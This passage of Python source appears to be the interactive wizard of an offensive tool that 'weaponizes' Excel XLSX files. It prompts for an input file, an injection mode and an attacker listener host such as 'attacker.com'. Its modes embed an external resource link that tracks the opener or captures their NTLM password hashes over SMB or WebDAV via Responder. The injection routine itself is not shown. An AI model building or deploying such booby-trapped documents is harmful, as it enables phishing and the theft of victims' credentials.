        external_url = construct_external_resource_url(
            mode, host, custom_path or None, use_https
        )
        if not external_url:
            out.error("Failed to construct resource URL")
            return
        
        success = weaponize_excel_file(input_file, output_file, external_url, verbose=True)
        
        if success:
            file_size = os.path.getsize(output_file)
            out.success(f"Weaponized file created: {output_file} ({format_size(file_size)})")
            print_next_steps(mode, host)
        else:
            out.error("Injection failed")
            sys.exit(1)
    
    except KeyboardInterrupt:
        print("\n")
        out.info("Cancelled by user.")
        sys.exit(0)


def _prompt_input_file():
    """Prompt for and validate the input file."""
    while True:
        file_path = input("  Input XLSX file: ").strip()
        if not file_path:
            print("    Cancelled.")
            return None
        
        # Strip quotes (drag-and-drop often adds them)
        file_path = file_path.strip('"').strip("'")
        
        error = validate_input_file(file_path)
        if error:
            out = OutputHandler()
            out.error(error)
            if "not found" in error.lower():
                out.hint("Check the file path - you can drag and drop the file into this terminal")
            continue
        
        return file_path


def _prompt_mode():
    """Prompt for injection mode selection."""
    print()
    print("  Select injection mode:")
    print("    [1] HTTP  - Tracking canary (captures IP, User-Agent, timing)")
    print("    [2] SMB   - NTLM hash capture (LAN - requires Responder)")
    print("    [3] WebDAV - NTLM hash capture (remote/internet)")
    print()
    
    mode_map = {'1': 'http', '2': 'smb', '3': 'webdav',
                'http': 'http', 'smb': 'smb', 'webdav': 'webdav'}
    
    while True:
        choice = input("  Mode [1/2/3]: ").strip().lower()
        if not choice:
            print("    Cancelled.")
            return None
        if choice in mode_map:
            return mode_map[choice]
        print("    Invalid choice. Enter 1, 2, or 3.")


def _prompt_host(mode):
    """Prompt for target host with mode-specific guidance."""
    print()
    if mode == "http":
        print("  Enter the hostname or IP of your HTTP listener.")
        print("  Example: myserver.com or 10.0.0.1:8080")
    elif mode == "smb":
        print("  Enter the IP of your Responder/SMB listener (LAN IP).")
        print("  Example: 192.168.1.100")
    elif mode == "webdav":
        print("  Enter the hostname of your WebDAV/Responder listener.")
        print("  Example: attacker.com")
    print()
    
    while True:
        host = input("  Host: ").strip()
        if not host:
            print("    Cancelled.")
            return None
        
        error = validate_host(host)
        if error:
            out = OutputHandler()
            out.error(error)
            continue
        
        return host


def _prompt_yes_no(prompt, default=True):
    """Prompt for yes/no with a default."""
    suffix = "[Y/n]" if default else "[y/N]"
    response = input(f"{prompt} {suffix}: ").strip().lower()
    if not response:
        return default
    return response in ('y', 'yes', 'ja', 'j')


def _prompt_optional(prompt):
    """Prompt for an optional value (empty string = None)."""
    value = input(prompt).strip()
    return value if value else None


if __name__ == "__main__":
    main()
